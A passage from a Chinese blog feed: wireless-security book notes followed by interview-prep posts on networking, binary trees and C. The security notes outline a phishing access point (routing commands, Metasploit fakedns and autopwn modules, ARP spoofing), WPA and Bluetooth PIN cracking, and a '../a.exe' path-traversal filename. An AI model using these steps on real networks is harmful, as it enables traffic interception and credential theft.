data-url="aHR0cDovL3d3dy5wYzYuY29tL2luZm92aWV3L0FydGljbGVfNTM4MTEuaHRtbA==" title="http://www.pc6.com/infoview/Article_53811.html">无线网络密码破解WPA/WPA2教程<i class="fa fa-external-link"></i></span></p><p>不过。还是不用担心，现在只是过程的漏洞，其加密协议本身，是安全的。目前对其进行破解的方法，只有碰撞，使用 <code>HashCat</code> 类的工具，进行俗称的<strong>跑包</strong>。</p><hr><ul><li>Wifi 环境下的客户端安全</li></ul><p>这部分主要是讲解 基于 Metasploit 框架的局域网安全。Browser_autopwn 模块实现了内网的钓鱼。</p><p>其中有一个部分 <strong>I_LOVE_MY_NEIGHBORS</strong>, 这里描述了在内网构建一个 Phishing 的热点。其主要步骤有：</p><ul><li>创建AP接入点</li><li>分配IP地址（路由）</li><li>搭建路由</li><li>重定向 HTTP 数据流</li><li>使用 Squid 软件提供 HTTP 内容服务</li></ul><p>具体的配置细节这里不展开描述，上面 Hostapd.conf/dhcpd.conf 的文件存在着前两项的内容。这里的搭建路由是比较point的。</p><pre><code>ifconfig wlan0 10.0.0.1 up netmask 255.255.255.0sysctl -w net.ip_forward=1netstat -r    # 查看路由表</code></pre><p>​<br>HTTP的重定向是通过iptable的配置实现的。Squid是一个实现HTTP代理的工具，使得用户通过我们的ap可以访问到外界的网站。默认的端口是 3128</p><hr><ul><li>phishing AP 的利用</li></ul><p>这里可以通过 wpa_supplicant 进行网络的连接。不过如果直接进行连接，存在着一个问题，就是我们的IP分配的记录可能被DHCP服务器所记录。</p><p>fakeDHCP的 利用：DHCP服务器是提供了动态的ip分配的功能，实际是这里存在一个问题。可以通过主动推送的方式，对客户端的 <strong>默认路由ip</strong> 和 <strong>Dns服务器ip</strong> 进行指派，当然客户端认为是合法的，所以会进行无条件的接受。</p><p>使用metaspolite里面的 </p><pre><code>auxiliary/server/fakedns    # 搭建一个假的DNS服务auxiliary/server/capture/http    # </code></pre><p>ARP欺骗。。。等等常见的 MITM(man in the middle)攻击</p><h2 id="蓝牙部分"><a href="#蓝牙部分" class="headerlink" title="蓝牙部分"></a>蓝牙部分</h2><p>主要概念有设备发现(device discovery)，跳频(frequency hopping)，微微网(piconet)。传统的在 2.4GHz上面定义了79个信道，每个信道有 1MHz 的带宽。设备的通信过程中是以每秒 1600次的频率在进行跳频。</p><p>3.0是高速蓝牙，4.0是低功耗蓝牙</p><p>在传统蓝牙中，PIN码这个东西不会陌生，在连接过程中会使用PIN码进行配对，称之为个人信息码。可以使用 BTCrack 对PIN码进行离线破解</p><p>对附近蓝牙的设备的扫描分为 <strong>主动扫描技术</strong> 和 <strong>被动扫描技术</strong> 。对于主动扫描，蓝牙设备必须是处于可发现状态。</p><p>在蓝牙协议中，并不要求另个通信设备之间进行 <strong>寻呼扫描(inquiry scan)</strong> 。</p><p>在被动状态下，<strong>只是需要获得其设备地址</strong>，既可以对其发起连接，可以见到的有我们的NFC连接蓝牙，和二维码连接蓝牙。</p><p>所以这里存在着地址穷举的问题，不过在bluetooth里面，MAC的值也是 48位的，</p><pre><code>eg:    00:11:22:33:44:55:66</code></pre><p>这样如果进行穷举，是可行的，不过这个量是很大的，可能设备都关闭了我们还是没有发现地址。</p><p>所以一个经典的思路是，如果设备可见，我们可以根据其官方的其他设备，得到MAC段（前5段 40位固定）。对特定的MAC段进行穷举，将会简单的多</p><hr><ul><li>常见蓝牙漏洞</li></ul><p>目录递归，构造恶意的文件名 如</p><pre><code>../a.exe</code></pre><p>这样文件将会被解析存储到上级目录，这样的方法可能存在目录被遍历的风险。实际上觉得这刚过不该蓝牙背。</p><p>IBeacon(灯塔) 正如名字一样，这刚是蓝牙的灯塔协议，这里不需要进行蓝牙的连接。可以通过特定的ID，进而得到特定的位置信息。</p><h2 id="其他网络"><a href="#其他网络" class="headerlink" title="其他网络"></a>其他网络</h2><p>小时候听到的猫的拨号音，实在是怀念。</p><blockquote><p>Modem<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2MTAyMjUwODAv" title="https://www.bilibili.com/video/av10225080/">拨号音<i class="fa fa-external-link"></i></span></p></blockquote><ul><li>SDR</li></ul><p>这部分，介绍了几个基本的SDR设备的使用，看看频谱之类的。</p><p>常见的 <strong>二进制频移键控(BFSK)</strong>.使用SDR 对其进行嗅探，及波形录制。之后可以有经典的 <strong>重放攻击</strong></p><p>当然此部分的前提是 SDR设备 和 GNUradio。、</p><p>如果在谱图上面 只有一个峰，那么可能是 开关键控，两个峰就是 二进制频移键控。对于采集的信号可以使用滤波器对其进行滤除，（升余弦滤波<br>器）</p><hr><ul><li>移动网络数据</li></ul><p>国内的2G是没有加密的，通过网上教程可以做到短信内容的嗅探，这里不予展开。</p><ul><li>移动基站 MS Moblie Station </li><li>SIM卡 Subscriber Identity Module 用户识别模块</li><li>移动用户临时识别码 TMSI </li><li>基站收发信台 BTS Base Transceiver Station</li><li>基站控制器 BSC</li><li>基站子系统 BSS</li><li>移动交换中心 MSC</li></ul><p><img src="https://gss2.bdstatic.com/9fo3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike92%2C5%2C5%2C92%2C30/sign=f850136fd7ca7bcb6976cf7ddf600006/b2de9c82d158ccbfe6df9f9619d8bc3eb135413e.jpg" alt=""></p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODUlQTglRTclOTAlODMlRTclQTclQkIlRTUlOEElQTglRTklODAlOUElRTQlQkYlQTElRTclQjMlQkIlRTclQkIlOUYvMjEwODQxMD9mcj1hbGFkZGlu" title="https://baike.baidu.com/item/%E5%85%A8%E7%90%83%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F/2108410?fr=aladdin">全球移动通信<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOTUlQkYlRTYlOUMlOUYlRTYlQkMlOTQlRTglQkYlOUIlRTYlOEElODAlRTYlOUMlQUYvMzIwMDkxOT9mcm9tdGl0bGU9TFRFJmFtcDtmcm9taWQ9NjQzOTA3OA==" title="https://baike.baidu.com/item/%E9%95%BF%E6%9C%9F%E6%BC%94%E8%BF%9B%E6%8A%80%E6%9C%AF/3200919?fromtitle=LTE&amp;fromid=6439078">4G长期演进<i class="fa fa-external-link"></i></span></p></blockquote><hr><ul><li>ZigBee简介</li></ul><p>ZigBee 在家具领域和楼宇自动化中，还是有较为坚实的地位。</p><p>一个主要的问题 why ZigBee？因为目前的 wifi,蓝牙，和其他的专有的通信解决方案里面为什么使用zb？这个在物联网的标准桥带之前，可能无法得到一个十分肯定的答案，如下：</p><ul><li>zigBee 的协议栈较之WIFI会简单上许多大小在 120KB 左右，完全可以运行在NVRam里。</li><li>其目前协议传输速度在 20~250Kbps </li></ul><p>早在1998年就已经提出了ZigBee技术。但是到2004 年才开始使用。</p><p>在ZigBee体系下有以下的多种的设备角色存在于 介质访问控制层：</p><ul><li>信任中心 TC Trust Center    对接入的设备进行认证</li><li>协调器 ZC Coordinator        代表其他的设备王朝其信息中继转发</li><li>路由器 ZR Router            和协调器功能类似，这个只从硬件上讲</li><li>终端设备 ZED End Device    可以接入ZigBee网络，但无法转发其他的信息帧</li></ul><p>关于ZigBee的网络结构，存在<strong>星形拓扑</strong>和 <strong>Mesh网格网络</strong>，前者的结构简单，后者的结构如下：</p><p><img src="https://gss3.bdstatic.com/7Po3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike92%2C5%2C5%2C92%2C30/sign=d587dd061e178a82da3177f2976a18e8/b17eca8065380cd7c6828527a144ad345882815f.jpg" alt=""></p><p>MESH在单词直译上讲是网孔的意思</p><p>ZigBee用于标准安全和高安全两种模式，信任中心使用 ACL(Accedd Contrl List)对接入设备进行控制，高安全下，有特点的新人中的角色，对其网络中的加密算法和密钥进行追踪.</p><ul><li>Zigbee 攻击</li></ul><p>特定硬件,KillerBee工具包,可能的方法有网络发现,重放攻击,数据伪造</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JpdmVybG9vcHNlYy9raWxsZXJiZWU=" title="https://github.com/riverloopsec/killerbee">KillerBee<i class="fa fa-external-link"></i></span> Proj</p></blockquote><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>这本书对无线的应用安全做了很好的汇总,十分广泛的层面,也是对自己零散的知识的总结,和部分的深入</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/04/25/Book_%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/#disqus_thread</comments>
    </item>
    
    <item>
      <title>剑指offer (4)</title>
      <link>https://www.diglp.xyz/2018/04/06/%E5%89%91%E6%8C%87offer_4/</link>
      <guid>https://www.diglp.xyz/2018/04/06/%E5%89%91%E6%8C%87offer_4/</guid>
      <pubDate>Thu, 05 Apr 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;网络方面的问题离不开 TCP/IP这玩意，所以这次做个详尽的总结&lt;/p&gt;
&lt;h2 id=&quot;网络&quot;&gt;&lt;a href=&quot;#网络&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>网络方面的问题离不开 TCP/IP这玩意，所以这次做个详尽的总结</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h3><p>经典的协议栈模型，当属OSI和TCP/IP 这两种。这里的一幅图，很好的展示了这个协议的层次</p><p><img src="https://images2015.cnblogs.com/blog/983980/201611/983980-20161121173924409-1128983178.png" alt="协议"></p><blockquote><p>图片引用自<span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9pbXlhbG9zdC9wLzYwODY4MDguaHRtbA==" title="imyalost">imyalost<i class="fa fa-external-link"></i></span></p><p>OSI模型分为<strong>7层</strong>， TCP/IP协议是<strong>4层</strong>，其中对应的关系也在途中很好的体现了出来。</p></blockquote><p>协议栈之所以为栈，因为其工作过程中的自顶而下的逐层封装的特性，这种逐层封装在传输终端也会逐层的解析。所以这种协议模式也成为<strong>对等协议</strong>，IP(Internet Protocol)</p><p>在我们的TCP/IP的协议栈中。具体的情况如下</p><pre><code>应用层    http请求                    http请求传输层    TCP/UDP头(端口)            TCP头    http请求网络层    IP头    (IP地址)                IP头        TCP头    http请求链路层    MAC头(MAC地址)                MAC头    IP头        TCP头    http请求</code></pre><p>所以协议栈自上而下是逐层封装的过程，各层也是负责其具体的职能</p><p>具体的层次之间的职能分共也是如下图所显示的。</p><p><img src="https://images2015.cnblogs.com/blog/983980/201611/983980-20161122175036159-1060298763.png" alt="作用"></p><blockquote><p>图片引用自<span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9pbXlhbG9zdC9wLzYwODY4MDguaHRtbA==" title="imyalost">imyalost<i class="fa fa-external-link"></i></span></p></blockquote><p>对上图的内容进行总结的话，实际上在传输层实现了<strong>端到端</strong>的通信，在网络层是实现了<strong>点到点</strong>的通信，或者说是主机和主机。到了数据链路层，主要的就是控制我们的数据包流向，这里就有了路由协议。</p><p>路由是存在于网络层，交换机，和中继器处于数据链路层。</p><p>传输层的端到端数据段(segment).网络层是点到点的数据包(packet).数据链路层是网络节点间的通信，数据帧(frame).下面的物理层就是以比特为单位的电平了。</p><h3 id="TCP-UDP"><a href="#TCP-UDP" class="headerlink" title="TCP/UDP"></a>TCP/UDP</h3><ol><li><p>TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接</p></li><li><p>TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付<br>Tcp通过校验和，重传控制，序号标识，滑动窗口、确认应答实现可靠传输。如丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制。</p></li><li><p>UDP具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。</p></li><li><p>每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信</p></li><li><p>TCP对系统资源要求较多，UDP对系统资源要求较少。</p></li></ol><h3 id="TCP-IP模型的安全性"><a href="#TCP-IP模型的安全性" class="headerlink" title="TCP/IP模型的安全性"></a>TCP/IP模型的安全性</h3><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p><strong>Q:</strong> 完全使用TCP的协议是？</p><p><strong>A:</strong> 这里需要注意的是 DNS 是同时涉及到<strong>TPC和UDP</strong>协议的，所以这里容易出错</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/04/06/%E5%89%91%E6%8C%87offer_4/#disqus_thread</comments>
    </item>
    
    <item>
      <title>剑指offer (3)</title>
      <link>https://www.diglp.xyz/2018/04/05/%E5%89%91%E6%8C%87offer_3/</link>
      <guid>https://www.diglp.xyz/2018/04/05/%E5%89%91%E6%8C%87offer_3/</guid>
      <pubDate>Wed, 04 Apr 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>有幸的划水了第一波腾讯的笔试。虽说整体过程的题目还是算容易，不过实际上还是由不少的困难。这次是自己的一点总结帖。</p><blockquote><p>离线开锁 声波锁 和 2FA 技术。</p></blockquote><h2 id="二叉树-BinTree"><a href="#二叉树-BinTree" class="headerlink" title="二叉树 (BinTree)"></a>二叉树 (BinTree)</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>定义:</p><blockquote><p>二叉树在图论中是这样定义的：二叉树是一个连通的<strong>无环图</strong>，并且每一个<strong>顶点的度不大于3</strong> 。有根二叉树还要满足<strong>根结点的度不大于2</strong>。有了根结点之后，每个顶点定义了唯一的父结点，和最多2个子结点。然而，没有足够的信息来区分左结点和右结点。如果不考虑连通性，允许图中有多个连通分量，这样的结构叫做森林。</p></blockquote><p>二叉树中每个节点都是他的左右字数的前驱，左右子树也是器根节点的后继。</p><p><strong>名词:words</strong></p><ul><li><strong>兄弟</strong> 具有同一父节点的节点</li><li><strong>祖先/子孙</strong> 如果y在x为根节点的子树中且 y &lt;&gt; x 则x 是y的祖先</li><li><strong>层数</strong> 规定根层数为0，其余结点层数等于其父节点层数加一。</li><li><strong>度数</strong> 节点的飞控字数个数即为树的度。</li><li><strong>树的高度</strong> 所有节点中的最大的层数称为二叉树的高度。</li><li><strong>树叶/分支</strong> 左右子树均为空的结点称为树叶，否则是称为分支节点。</li><li>特殊二叉树<ul><li>满二叉树 如果任意节点都有两棵非空子树或者树叶。</li><li>完全二叉树 只有最下面的两侧的节点度数小于2 其他的层各节点的度数等于2 。</li></ul></li></ul><p><img src="https://gss0.bdstatic.com/-4o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=514ddfeb9aef76c6c4dff379fc7f969f/faedab64034f78f043a6973973310a55b2191c4e.jpg" alt="二叉树"></p><p><strong>性质：</strong></p><ul><li>第i层最多有 2^i个节点</li></ul><h3 id="数据存储结构"><a href="#数据存储结构" class="headerlink" title="数据存储结构"></a>数据存储结构</h3><p><strong>顺序存储结构</strong></p><p>对应一个二叉树，我们使用语言实现它</p><pre><code>#define Maxsize 100     //假设一维数组最多存放100个元素typedef char Datatype;  //假设二叉树元素的数据类型为字符typedef struct{         Datatype bt[Maxsize];    int btnum;}Btseq;</code></pre><p>这里的顺序存储结构，实际上是可以看作，是吧二叉树压扁，投影在一个数组里。</p><p>如上图 A是根，B是其左节点，C是其右节点。那么我们在顺序存储中得到的数组的内容是：</p><pre><code>ABCD^EFGH^^^I^^</code></pre><p><strong>链式存储结构</strong></p><p>这里是使用链式结构，具体代码如下：</p><pre><code>typedef char Datatype;  //定义二叉树元素的数据类型为字符typedef struct  node   //定义结点由数据域，左右指针组成{     Datatype data;    struct node *lchild,*rchild;}Bitree;</code></pre><p>这个结构是见解明了了。一个三个元素，本身的数据。左子树和右子树。<br><img src="https://images2015.cnblogs.com/blog/997648/201609/997648-20160914154443727-1008004693.png" alt="BitTree"></p><h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><p>这个问题算是一个超级基本的问题了，基本上是逃不过的。不过之前的印象深刻滚瓜烂熟。突然遇到还是懵逼一会。所以及时总结，加强记忆。</p><p>通常来说对二叉树的遍历有以下的三种方式。</p><ul><li>NLR：前序遍历(Preorder Traversal 亦称（先序遍历））    （根左右）</li><li>LNR：中序遍历(Inorder Traversal)                    （左根右）</li><li>LRN：后序遍历(Postorder Traversal)                    （左右根）</li></ul><p>这里采用第二种存储方式.如果我们对其孩子节点进行一次访问，那么我们对其指针进行一次指向即可。</p><pre><code>node lChild = *this-&gt;lchild;</code></pre><p>这里采用递归的方法。对整个的二叉树的结构进行遍历，并打印其值</p><p><strong>前序遍历</strong></p><pre><code>void preTraversal(node* root){cout &lt;&lt; root-&gt;data;                    //先进行根操作if(root-&gt;lchild != NULL)                // 实际上的遍历的类型在这里是其操作顺序决定的，    preTraversal(root-&gt;lchild);if(root-&gt;rchild != NULL)    preTraversal(root-&gt;rchild);}</code></pre><p><strong>中序遍历</strong></p><pre><code>void preTraversal(node* root){if(root-&gt;lchild != NULL)                // 实际上的遍历的类型在这里是其操作顺序决定的，    preTraversal(root-&gt;lchild);cout &lt;&lt; root-&gt;data;                    // 当上面的递归开始返回的时候，第一次执行的是我们的左叶子节点                                    // 当第一次返回后，现在是该节点的父节点，即根节点if(root-&gt;rchild != NULL)                // 之后继续查找右节点    preTraversal(root-&gt;rchild);        // 这次调用，会打印右节点的值}</code></pre><p><strong>后序遍历</strong></p><pre><code>void preTraversal(node* root){if(root-&gt;lchild != NULL)                // 实际上的遍历的类型在这里是其操作顺序决定的，    preTraversal(root-&gt;lchild);            if(root-&gt;rchild != NULL)                    preTraversal(root-&gt;rchild);cout &lt;&lt; root-&gt;data;        }</code></pre><p>这里递归的思路是一定要清楚，如果我们画出了调用栈，那个更清楚。</p><h3 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h3><p><strong>Q:</strong> 某二叉树前序遍历访问顺序是abdgcefh，中序遍历访问顺序是dgbaechf，则后序遍历的结点访问顺序是多少？ </p><p><strong>A:</strong> 这个是超经典的一类问题了，可能考试都要考它。实际上我们的分析，思路如下：我们要做到的是还原二叉树。从第一个我们可以得到 根节点是 a，中序遍历的话是左根右的顺序，所以我们可以找到在中续遍历中找到a，把其分为agb，和aechf两个子树。</p><p>之后周而复始，bdg也是根左右。cefh也是根左右。之后c取出分e，hf两个子树。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/04/05/%E5%89%91%E6%8C%87offer_3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>剑指offer (2)</title>
      <link>https://www.diglp.xyz/2018/04/01/%E5%89%91%E6%8C%87offer_2/</link>
      <guid>https://www.diglp.xyz/2018/04/01/%E5%89%91%E6%8C%87offer_2/</guid>
      <pubDate>Sat, 31 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;西西弗斯一般的生活，loop，loop，感觉良好，卒&lt;/p&gt;
&lt;h2 id=&quot;For-A-While&quot;&gt;&lt;a
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>西西弗斯一般的生活，loop，loop，感觉良好，卒</p><h2 id="For-A-While"><a href="#For-A-While" class="headerlink" title="For A While"></a>For A While</h2><h3 id="空循环体"><a href="#空循环体" class="headerlink" title="空循环体"></a>空循环体</h3><p><code>for</code> 和 <code>while</code>哪个效率高？自古也是成了圣战的话题。<br>这里自己做一个简单分析。</p><pre><code>int main(){    while(1);}int main(){    for(;;);}    </code></pre><p>两种死循环语句，后者是歪果仁喜欢用的，倒是觉得第一种更贴切。之后使用gcc</p><pre><code>g++ *.c -S [-O1/-O2/-O3]</code></pre><p>发现在这种情况下，编译器给出的汇编内容实际上都是一样的，两种循环一样，三种优化也是一样。下面是其汇编代码。</p><pre><code>        .file   &quot;while.cpp&quot;        .def    ___main;        .scl    2;      .type   32;     .endef        .section        .text.startup,&quot;x&quot;        .p2align 4,,15        .globl  _main        .def    _main;  .scl    2;      .type   32;     .endef_main:LFB0:        .cfi_startproc    ; 调用框架指令        pushl   %ebp    ; 这里把当前域(Caller)的基址压栈        .cfi_def_cfa_offset 8    ;         .cfi_offset 5, -8        movl    %esp, %ebp    ; 把esp值传入ebp        .cfi_def_cfa_register 5        andl    $-16, %esp    ;         call    ___mainL2:                            ; 这里是我们的循环部分        jmp     L2        .cfi_endprocLFE0:        .ident  &quot;GCC: (MinGW.org GCC-6.3.0-1) 6.3.0&quot;</code></pre><p>可以看到 LFB0 的代码是main的caller部分，主要功能是把当前函数的ebp(基址寄存器)压栈，以便函数返回时数据的恢复。之后把esp传给ebp，就是以当前的栈地址作为main函数(被调用函数的地址)。</p><pre><code>andl    $-16, %esp    ;</code></pre><p>这句本来有点懵，不过实际上看看这个-16是什么就很清楚了，</p><pre><code>-16D = 11110000B</code></pre><p>所以实际上这个and 是对esp寄存的一次掩码。掩去esp的第四位。</p><p>不过这里的核心代码统统是下面这句了：    </p><pre><code>L2:     jmp  L2</code></pre><p>一个指令，一个操作数。很简洁简单，并看不出差别</p><h3 id="自加"><a href="#自加" class="headerlink" title="自加"></a>自加</h3><pre><code>int main(){    int i = 0;     /* ++i while循环 */     while (++i &lt; 10);     i = 0;     /* ++i dowhile循环 */     do;     while (++i &lt; 10);     /* ++i for循环 */     for (i = 0; i &lt; 10; ++i);}</code></pre><p>这里使用自加作为循环体，非空循环体。下面一样是汇编代码。</p><pre><code>        .file   &quot;add.cpp&quot;        .def    ___main;        .scl    2;      .type   32;     .endef        .text        .globl  _main        .def    _main;  .scl    2;      .type   32;     .endef_main:LFB0:        .cfi_startproc        pushl   %ebp        .cfi_def_cfa_offset 8        .cfi_offset 5, -8        movl    %esp, %ebp        .cfi_def_cfa_register 5        andl    $-16, %esp        subl    $16, %esp        ; 由于栈是向低地址生长，所以这里开辟栈空间        call    ___main        movl    $0, 12(%esp)    ; 这里是间接寻址 esp+0*0+12    实际上是我们局部变量 i 的值的初始化;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    L3:        addl    $1, 12(%esp)        cmpl    $9, 12(%esp)        setle   %al        testb   %al, %al        je      L2        jmp     L3L2:        movl    $0, 12(%esp);;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;L5:        addl    $1, 12(%esp)        cmpl    $9, 12(%esp)        setle   %al        testb   %al, %al        je      L4        jmp     L5L4:        movl    $0, 12(%esp);;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;L7:        cmpl    $9, 12(%esp)        jg      L6        addl    $1, 12(%esp)        jmp     L7;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;L6:        movl    $0, %eax    ; main返回值是0        leave        .cfi_restore 5        .cfi_def_cfa 4, 4        ret        .cfi_endprocLFE0:        .ident  &quot;GCC: (MinGW.org GCC-6.3.0-1) 6.3.0&quot;</code></pre><p>很明显这里的循环体所对应的操作已经出现了差异。相比较这三种循环。</p><ul><li>while     6</li><li>do_while     6</li><li>for         4</li></ul><p>综上看出了，实际上可能在部分情况下for是有优势的。不过实际上我们对比，在while中实际上多了两条语句</p><pre><code>setle   %altestb   %al, %al</code></pre><p><strong>setle D, D = (SF ^ OF) | ZF, 小于等于(有符号&lt;=)</strong><br>这个指令不常见，所以去search之。这个指令是属于访问条件码指令。</p><p>作用:  &lt;= 时设定操作数值为1 ，否则为0 //一般与cmp指令组合使用</p><p>所以上述的指令目的，是判断Cmp的结果是不是小于等于，如果是就把al置1。再判断al是否为1。如果是0就跳出，否则说明，还需要继续循环。<br>不过实际上，觉得这一步是相当冗余的。不知为何</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/04/01/%E5%89%91%E6%8C%87offer_2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>剑指offer (1)</title>
      <link>https://www.diglp.xyz/2018/03/30/%E5%89%91%E6%8C%87offer_1/</link>
      <guid>https://www.diglp.xyz/2018/03/30/%E5%89%91%E6%8C%87offer_1/</guid>
      <pubDate>Thu, 29 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Let it known，don’t let it
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><blockquote><p>Let it known，don’t let it go.</p></blockquote><p>操场上，看见一个在练习滑板的女孩，不小心摔倒。婉然微笑，撑起身来。是如此的优雅(graceful)。</p><p>一语言，只是一种工具，任何一门编程语音都是。数据结构和算法才是他的灵魂</p><h2 id="标准输入输出"><a href="#标准输入输出" class="headerlink" title="标准输入输出"></a>标准输入输出</h2><p>平日里，使用C/C++在Coding时，C中的<code>printf，scanf</code>和C++里面的<code>cout,cin</code>显然我们时十分的熟悉了</p><pre><code>int printf ( const char * format, ... );int scanf ( const char * format, ... );extern istream cin;str &gt;&gt; cin;extern ostream cout;cout &lt;&lt; str;</code></pre><p><strong>Q&amp;A</strong></p><p>Q:为什么S函数需要&amp;， 而P不需要？</p><p>A:&amp; 在C中时作为单目运算符时，时寻址作用。这里在S写入时需要一个指针指向一个真实的分配的对象空间，用来存储他的相应的数据类型。在P函数中，时写这个C字符串的格式化内容到stdout中。在字符串的响应位置，是用后面的参数直接对内容进行替换，所以不必使用&amp;对其真实的内存空间进行操作。</p><hr><p>事实上，这些输入输出函数，底层进行操作的就是我们的输入输出流。</p><blockquote><p>执行一个shell命令行时通常会自动打开三个标准文件，即标准输入文件（stdin），通常对应终端的键盘；标准输出文件（stdout）和标准错误输出文件（stderr），这两个文件都对应终端的屏幕。</p></blockquote><p>所以这里我们可以把输入和输出看作一个文件，使用操作文件的方法，对这些文件指针进行操作。</p><pre><code>FILE * stdin;FILE * stdout;FILE * stderr;</code></pre><p>上面是着三个文件值指针的定义，在stdion.h 中</p><pre><code>#include &lt;stdio.h&gt;int main(int argc, char** argv){    int num;     fscanf(stdin, &quot;%d&quot;, &amp;num);    fprintf(stdout, &quot;%d\n&quot;,num);        getchar();    return 0;}</code></pre><hr><p>可以看到，上面的stdin和stdout是直接进行操作的，没有打开的过程。因为在这个控制台程序运行起初，就已经打开了这三个流文件。</p><h2 id="流缓冲"><a href="#流缓冲" class="headerlink" title="流缓冲"></a>流缓冲</h2><p>看看这段代码会发生什么？会一秒一次的打印字符串对吧？实际上不然。真正的结果是。在程结束之后，会打印一堆的blah</p><pre><code>int main(int argc, char **argv){    for (int i = 0; i &lt; 10; i++){        printf(&quot;%s&quot;, &quot;balabala&quot;);            sleep(1);    }    return 0;}</code></pre><p>C++ 程序中把输入输出是看作了字节流。在io过程中，程序只负责检查字节流，而完全不用知道是从哪里来的。</p><p>所以在流处理的过程中，一个重要的过程就是缓冲。当发生一次打印的条件是</p><pre><code>- 缓冲区满- 遇到换行符(EOF)- 程序正常结束</code></pre><p>stdout，和stderr 都是输出流，前者存在缓冲，后者是没有缓冲的。<br>我们可以用<code>int fflush(FILE *stream);</code>函数进行强制的缓冲区刷新。    </p><pre><code>cout &lt;&lt; flush;flush(cout);</code></pre><p>或者使用 steambuf 类里面的方法进行。如果直接进行<code>setbuf(stdout,Null)</code>，把他的缓冲区设为0。这样stdout也是成为了无缓冲的流了</p><hr><p><strong>Q&amp;A</strong></p><p>Q:缓冲区的好处？<br>A:使用缓冲区是可以更高效的处理输入和输出。缓冲区是作为中介的内存空间。我们可以一撮进行大量的读取或者写入。之后再进行整块的字节操作。这样会比单字节操作快得多。</p><h2 id="iostream类库"><a href="#iostream类库" class="headerlink" title="iostream类库"></a>iostream类库</h2><p>在C++中，iostream是作为流管理的。在其中有创建<strong>4个</strong>流对象。<br>(<strong>实际上可以讲8个，四个是用于窄字节char，四个用于宽字节wchar</strong>)。</p><ul><li><p>cin    标准输入流对象(stdin)        wcin</p></li><li><p>cout    标准输出流对象(stdout)    wcout</p></li><li><p>cerr    标准错误流对象(stderr)    wcerr    无缓冲</p></li><li><p>clog    标准错误流对象。            wclog    缓冲</p></li></ul><p>流的一端和程序相连，另一端和标准IO相连。</p><p><strong>Q&amp;A</strong><br>Q:重定向？<br>A:实际上在iostream这个类库里， <code>&lt;&lt;,&gt;&gt;</code>这两个本来是作为移位运算的操作符，被重载。在这个情况下 &lt;&lt; 是应该被成为插入运算符。</p><p>在<code>cout &lt;&lt; 